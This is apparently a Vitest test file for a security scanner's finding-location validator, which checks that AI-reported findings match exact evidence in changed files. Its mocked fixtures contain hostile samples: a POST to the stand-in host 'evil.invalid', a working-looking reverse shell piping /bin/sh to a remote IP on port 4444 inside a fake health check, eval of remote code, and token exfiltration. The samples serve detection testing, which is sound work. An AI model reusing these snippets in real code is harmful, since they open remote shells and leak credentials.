import { describe, it, expect, vi, beforeEach } from 'vitest';
import type { AdapterStatuses, ProcessedFinding, SpectreScanStatus } from '../types.js';

const mockReadFile = vi.fn();

vi.mock('fs/promises', () => ({
  readFile: mockReadFile,
}));

const { applyAdapterValidationCoverage, applySpectreValidationCoverage, validateFindingLocations } = await import('../location-validator.js');

function completeStatuses(): AdapterStatuses {
  return {
    semgrep: { outcome: 'complete' },
    trufflehog: { outcome: 'complete' },
    claude: { outcome: 'complete' },
    spectre: {
      outcome: 'complete', selected: 1, scanned: 1, skipped: 0, oversized: 0, capped: 0, truncated: 0,
      failed: 0, invalidResponses: 0, rejectedFindings: 0, cancelled: 0, rateLimited: 0,
      concurrencyLimited: 0, circuitOpen: 0,
    },
    'dep-doctor': { outcome: 'complete' },
  };
}

describe('validateFindingLocations()', () => {
  beforeEach(() => vi.clearAllMocks());

  it('passes through non-Claude findings as validated', async () => {
    const findings: ProcessedFinding[] = [{
      file: 'src/app.js',
      line: 3,
      severity: 'high',
      message: 'issue',
      ruleId: 'semgrep/x',
      tool: 'semgrep',
    }];

    const [finding] = await validateFindingLocations(findings, {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.annotationEligible).toBe(true);
    expect(finding.startLine).toBe(3);
    expect(finding.endLine).toBe(3);
  });

  it('resolves Claude findings from a unique exact evidence match, ignoring model-reported lines', async () => {
    mockReadFile.mockResolvedValueOnce('line1\nconst token = getSecret();\nline3\n');

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      line: 99,
      startLine: 99,
      endLine: 99,
      evidence: 'const token = getSecret();',
      severity: 'high',
      message: 'secret exfiltration',
      ruleId: 'claude/x',
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.evidenceStatus).toBe('unique');
    expect(finding.locationReason).toBe('validated-by-evidence');
    expect(finding.annotationEligible).toBe(true);
    expect(finding.annotationReason).toBe('anchored-by-evidence');
    expect(finding.anchorKind).toBe('line');
    expect(finding.anchorLine).toBe(2);
    expect(finding.startLine).toBe(2);
    expect(finding.endLine).toBe(2);
    expect(finding.annotationStartLine).toBe(2);
    expect(finding.annotationEndLine).toBe(2);
    expect(finding.suppressionLine).toBe(2);
  });

  it('maps multi-line Claude evidence to the exact span in the file', async () => {
    mockReadFile.mockResolvedValueOnce(
      'function backdoor() {\n' +
      '  fetch("https://evil.invalid", {\n' +
      '    method: "POST",\n' +
      '  });\n' +
      '}\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      evidence: 'fetch("https://evil.invalid", {\n    method: "POST",',
      severity: 'high',
      message: 'credential exfiltration',
      ruleId: 'claude/x',
      line: 1,
      startLine: 1,
      endLine: 1,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.anchorKind).toBe('span');
    expect(finding.startLine).toBe(2);
    expect(finding.endLine).toBe(3);
    expect(finding.annotationStartLine).toBe(2);
    expect(finding.annotationEndLine).toBe(3);
  });

  it('uses a validated declaration anchor for annotation while preserving the evidence span', async () => {
    mockReadFile.mockResolvedValueOnce(
      'export function collectDiagnostics(context = {}) {\n' +
      '  const headers = normalizeHeaders(context.headers);\n' +
      '  const interesting = [\n' +
      "    'GITHUB_APP_PRIVATE_KEY',\n" +
      '  ];\n' +
      '  return {\n' +
      '    body: serializeSnapshot(interesting),\n' +
      '  };\n' +
      '}\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      anchorKind: 'declaration',
      anchorLine: 1,
      evidence: 'body: serializeSnapshot(interesting),',
      severity: 'high',
      message: 'credential exfiltration',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.evidenceStartLine).toBe(7);
    expect(finding.evidenceEndLine).toBe(7);
    expect(finding.startLine).toBe(1);
    expect(finding.endLine).toBe(7);
    expect(finding.anchorKind).toBe('declaration');
    expect(finding.anchorLine).toBe(1);
    expect(finding.annotationStartLine).toBe(1);
    expect(finding.annotationEndLine).toBe(7);
    expect(finding.suppressionLine).toBe(1);
    expect(finding.annotationReason).toBe('anchored-by-validated-declaration');
  });

  it('falls back to the evidence span when a declaration anchor hint is not valid', async () => {
    mockReadFile.mockResolvedValueOnce(
      'line1\n' +
      'const transport = pickTransport(\'export\');\n' +
      'line3\n' +
      'body: serializeSnapshot(interesting),\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      anchorKind: 'declaration',
      anchorLine: 2,
      evidence: 'body: serializeSnapshot(interesting),',
      severity: 'high',
      message: 'credential exfiltration',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.evidenceStartLine).toBe(4);
    expect(finding.evidenceEndLine).toBe(4);
    expect(finding.startLine).toBe(4);
    expect(finding.endLine).toBe(4);
    expect(finding.anchorKind).toBe('line');
    expect(finding.anchorLine).toBe(4);
    expect(finding.annotationStartLine).toBe(4);
    expect(finding.annotationEndLine).toBe(4);
    expect(finding.annotationReason).toBe('anchored-by-evidence');
  });

  it('rejects Claude findings that omit evidence', async () => {
    mockReadFile.mockResolvedValueOnce('line1\nmalicious();\nline3\n');

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      severity: 'high',
      message: 'suspicious',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.evidenceStatus).toBe('missing');
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('missing-evidence');
    expect(finding.annotationReason).toBe('missing-evidence');
  });

  it('rejects Claude findings when the evidence is ambiguous in the file', async () => {
    mockReadFile.mockResolvedValueOnce('dup();\nline2\ndup();\n');

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      evidence: 'dup();',
      severity: 'high',
      message: 'duplicate',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.evidenceStatus).toBe('ambiguous');
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('ambiguous-evidence');
    expect(finding.annotationReason).toBe('ambiguous-evidence');
  });

  it('rejects Claude findings when the evidence is not found in the file', async () => {
    mockReadFile.mockResolvedValueOnce('line1\nsafe();\nline3\n');

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      evidence: 'malicious();',
      severity: 'high',
      message: 'not grounded',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.evidenceStatus).toBe('not-found');
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('evidence-not-found');
    expect(finding.annotationReason).toBe('evidence-not-found');
  });

  it('rejects Claude findings for files outside the changed file set', async () => {
    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      evidence: 'malicious();',
      severity: 'high',
      message: 'off diff',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/other.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('file-not-in-diff');
    expect(finding.annotationReason).toBe('file-not-in-diff');
  });

  it('rejects Claude findings when the file cannot be read', async () => {
    mockReadFile.mockRejectedValueOnce(new Error('ENOENT'));

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      evidence: 'malicious();',
      severity: 'high',
      message: 'unreadable',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('file-unreadable');
    expect(finding.annotationReason).toBe('file-unreadable');
  });

  // ---------------------------------------------------------------------------
  // spectre findings
  // ---------------------------------------------------------------------------

  it('routes spectre findings through the evidence pipeline (strict evidence-only)', async () => {
    mockReadFile.mockResolvedValueOnce(
      'export function createHealthCheck(options = {}) {\n' +
      '  const socket = net.connect(options.port ?? 4444, options.host ?? \'198.51.100.42\');\n' +
      '  const shell = spawn(\'/bin/sh\', [\'-i\'], { stdio: [\'pipe\', \'pipe\', \'pipe\'] });\n' +
      '  return { socket, shell };\n' +
      '}\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/health.js',
      line: 99,
      startLine: 99,
      endLine: 99,
      evidence: 'net.connect(options.port ?? 4444, options.host ?? \'198.51.100.42\')',
      anchorKind: 'declaration',
      anchorLine: 1,
      severity: 'high',
      message: 'reverse shell',
      ruleId: 'reverse-shell',
      tool: 'spectre',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/health.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.evidenceStatus).toBe('unique');
    expect(finding.locationReason).toBe('validated-by-evidence');
    expect(finding.annotationEligible).toBe(true);
    // Pi Agent uses strict evidence-only positioning - ignores anchorKind/anchorLine
    expect(finding.startLine).toBe(2);
    expect(finding.endLine).toBe(2);
    expect(finding.anchorKind).toBe('line');
    expect(finding.annotationReason).toBe('anchored-by-evidence');
  });

  it('always uses evidence location for spectre findings regardless of function size', async () => {
    mockReadFile.mockResolvedValueOnce(
      'export function createHealthCheck(options = {}) {\n' +
      '  const socket = net.connect(options.port ?? 4444, options.host ?? \'198.51.100.42\');\n' +
      '  const shell = spawn(\'/bin/sh\', [\'-i\'], { stdio: [\'pipe\', \'pipe\', \'pipe\'] });\n' +
      '  socket.pipe(shell.stdin);\n' +
      '  shell.stdout.pipe(socket);\n' +
      '  shell.stderr.pipe(socket);\n' +
      '  return { socket, shell };\n' +
      '}\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/health.js',
      line: 7,
      startLine: 7,
      endLine: 7,
      evidence: 'return { socket, shell };',
      severity: 'high',
      message: 'reverse shell',
      ruleId: 'reverse-shell',
      tool: 'spectre',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/health.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.evidenceStatus).toBe('unique');
    // Pi Agent uses strict evidence-only positioning - no declaration scanning
    expect(finding.startLine).toBe(7);
    expect(finding.endLine).toBe(7);
    expect(finding.anchorKind).toBe('line');
    expect(finding.annotationReason).toBe('anchored-by-evidence');
  });

  it('uses evidence location for spectre regardless of distance from declaration', async () => {
    const fillerLines = Array.from({ length: 55 }, (_, i) => `  // filler ${i + 1}\n`).join('');
    mockReadFile.mockResolvedValueOnce(
      'export function earlyDecl() {\n' +
      fillerLines +
      '  eval(remoteCode);\n' +
      '}\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/health.js',
      line: 57,
      evidence: 'eval(remoteCode);',
      severity: 'high',
      message: 'covert execution',
      ruleId: 'covert-execution',
      tool: 'spectre',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/health.js'],
    });

    expect(finding.locationValidated).toBe(true);
    // Pi Agent always uses evidence location - no declaration scanning
    expect(finding.startLine).toBe(57);
    expect(finding.endLine).toBe(57);
    expect(finding.anchorKind).toBe('line');
    expect(finding.annotationReason).toBe('anchored-by-evidence');
  });

  it('ignores anchorKind on spectre findings — always uses evidence location', async () => {
    mockReadFile.mockResolvedValueOnce(
      'export function exfilData() {\n' +
      '  const a = collectSecrets();\n' +
      '  const b = uploadToC2(a);\n' +
      '  return b;\n' +
      '}\n'
    );

    const [finding] = await validateFindingLocations([{
      file: 'src/health.js',
      line: 2,
      evidence: 'const a = collectSecrets();\n  const b = uploadToC2(a);',
      anchorKind: 'span',
      severity: 'high',
      message: 'credential exfiltration',
      ruleId: 'credential-exfiltration',
      tool: 'spectre',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/health.js'],
    });

    expect(finding.locationValidated).toBe(true);
    // Pi Agent ignores anchorKind and always uses evidence location
    expect(finding.startLine).toBe(2);
    expect(finding.endLine).toBe(3);
    expect(finding.anchorKind).toBe('span');
    expect(finding.annotationReason).toBe('anchored-by-evidence');
  });

  it('rejects spectre findings that omit evidence', async () => {
    mockReadFile.mockResolvedValueOnce('line1\nmalicious();\nline3\n');

    const [finding] = await validateFindingLocations([{
      file: 'src/health.js',
      severity: 'high',
      message: 'suspicious',
      ruleId: 'reverse-shell',
      line: 0,
      tool: 'spectre',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/health.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.evidenceStatus).toBe('missing');
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('missing-evidence');
    expect(finding.annotationReason).toBe('missing-evidence');
  });

  it('rejects spectre findings for files outside the changed file set', async () => {
    const [finding] = await validateFindingLocations([{
      file: 'src/health.js',
      evidence: 'malicious();',
      severity: 'high',
      message: 'off diff',
      ruleId: 'reverse-shell',
      line: 0,
      tool: 'spectre',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/other.js'],
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('file-not-in-diff');
    expect(finding.annotationReason).toBe('file-not-in-diff');
  });

  it('rejects spectre evidence that resolves outside the changed line ranges', async () => {
    mockReadFile.mockResolvedValueOnce('old suspicious();\nconst safe = true;\nnewlyChanged();\n');
    const [finding] = await validateFindingLocations([{
      file: 'src/app.js', evidence: 'old suspicious();', severity: 'high', message: 'stale code',
      ruleId: 'covert-execution', line: 3, startLine: 3, endLine: 3, tool: 'spectre',
    }], {
      workspacePath: '/tmp/ws', changedFiles: ['src/app.js'],
      changedLineRanges: new Map([['src/app.js', [{ start: 3, end: 3 }]]]),
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.annotationEligible).toBe(false);
    expect(finding.locationReason).toBe('evidence-outside-changed-range');
  });

  it('validates multiline spectre evidence in a CRLF file', async () => {
    mockReadFile.mockResolvedValueOnce('const token = process.env.TOKEN;\r\nawait send(token);\r\n');
    const [finding] = await validateFindingLocations([{
      file: 'src/app.js', evidence: 'const token = process.env.TOKEN;\nawait send(token);', severity: 'high',
      message: 'credential exfiltration', ruleId: 'credential-exfiltration', line: 99, tool: 'spectre',
    }], {
      workspacePath: '/tmp/ws', changedFiles: ['src/app.js'],
      changedLineRanges: new Map([['src/app.js', [{ start: 1, end: 2 }]]]),
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.startLine).toBe(1);
    expect(finding.endLine).toBe(2);
  });

  it('uses changed ranges to disambiguate repeated spectre evidence', async () => {
    mockReadFile.mockResolvedValueOnce('send(token);\nconst safe = true;\nsend(token);\n');
    const [finding] = await validateFindingLocations([{
      file: 'src/app.js', evidence: 'send(token);', severity: 'high', message: 'exfiltration',
      ruleId: 'credential-exfiltration', line: 1, tool: 'spectre',
    }], {
      workspacePath: '/tmp/ws', changedFiles: ['src/app.js'],
      changedLineRanges: new Map([['src/app.js', [{ start: 3, end: 3 }]]]),
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.startLine).toBe(3);
  });

  it('uses a verified provider line hint when repeated spectre evidence is changed twice', async () => {
    mockReadFile.mockResolvedValueOnce('send(token);\nconst safe = true;\nsend(token);\n');
    const [finding] = await validateFindingLocations([{
      file: 'src/app.js', evidence: 'send(token);', severity: 'high', message: 'exfiltration',
      ruleId: 'credential-exfiltration', line: 1, reportedStartLine: 3, reportedEndLine: 3, tool: 'spectre',
    }], {
      workspacePath: '/tmp/ws', changedFiles: ['src/app.js'],
      changedLineRanges: new Map([['src/app.js', [{ start: 1, end: 1 }, { start: 3, end: 3 }]]]),
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.startLine).toBe(3);
  });

  it('rejects spectre evidence that is only partially changed', async () => {
    mockReadFile.mockResolvedValueOnce('const token = process.env.TOKEN;\nawait send(token);\n');
    const [finding] = await validateFindingLocations([{
      file: 'src/app.js', evidence: 'const token = process.env.TOKEN;\nawait send(token);', severity: 'high',
      message: 'credential exfiltration', ruleId: 'credential-exfiltration', line: 2, tool: 'spectre',
    }], {
      workspacePath: '/tmp/ws', changedFiles: ['src/app.js'],
      changedLineRanges: new Map([['src/app.js', [{ start: 2, end: 2 }]]]),
    });

    expect(finding.locationValidated).toBe(false);
    expect(finding.locationReason).toBe('evidence-outside-changed-range');
  });

  it('keeps Claude findings inlineable even when the exact evidence is outside the changed hunks', async () => {
    mockReadFile.mockResolvedValueOnce('line1\nconst token = getSecret();\nline3\n');

    const [finding] = await validateFindingLocations([{
      file: 'src/app.js',
      evidence: 'const token = getSecret();',
      severity: 'high',
      message: 'secret exfiltration',
      ruleId: 'claude/x',
      line: 0,
      tool: 'claude',
    }], {
      workspacePath: '/tmp/ws',
      changedFiles: ['src/app.js'],
    });

    expect(finding.locationValidated).toBe(true);
    expect(finding.annotationEligible).toBe(true);
    expect(finding.annotationStartLine).toBe(2);
    expect(finding.annotationEndLine).toBe(2);
  });
});

describe('adapter validation coverage', () => {
  const rejectedClaudeFinding: ProcessedFinding = {
    file: 'src/app.js', line: 2, severity: 'high', message: 'candidate', ruleId: 'claude/x', tool: 'claude',
    locationValidated: false,
  };
  const rejectedSpectreFinding: ProcessedFinding = {
    file: 'src/app.js', line: 2, severity: 'high', message: 'candidate', ruleId: 'spectre/x', tool: 'spectre',
    locationValidated: false,
  };

  it('marks every enabled evidence-validated adapter incomplete when findings are rejected', () => {
    const statuses = completeStatuses();

    expect(applyAdapterValidationCoverage(statuses, [rejectedClaudeFinding, rejectedSpectreFinding])).toBe(2);

    expect(statuses.claude).toEqual({ outcome: 'incomplete', reason: 'finding-validation-rejected' });
    expect(statuses.spectre).toMatchObject({
      outcome: 'incomplete', rejectedFindings: 1, reason: 'finding-validation-rejected',
    });
  });

  it('does not change disabled adapter statuses for rejected findings', () => {
    const statuses = completeStatuses();
    statuses.claude = { outcome: 'disabled' };

    expect(applyAdapterValidationCoverage(statuses, [rejectedClaudeFinding])).toBe(0);
    expect(statuses.claude).toEqual({ outcome: 'disabled' });
  });

  it('retains the Spectre-only helper used by the simulator', () => {
    const status: SpectreScanStatus = completeStatuses().spectre;

    expect(applySpectreValidationCoverage(status, [rejectedSpectreFinding])).toBe(1);
    expect(status).toMatchObject({
      outcome: 'incomplete', rejectedFindings: 1, reason: 'finding-validation-rejected',
    });
  });
});
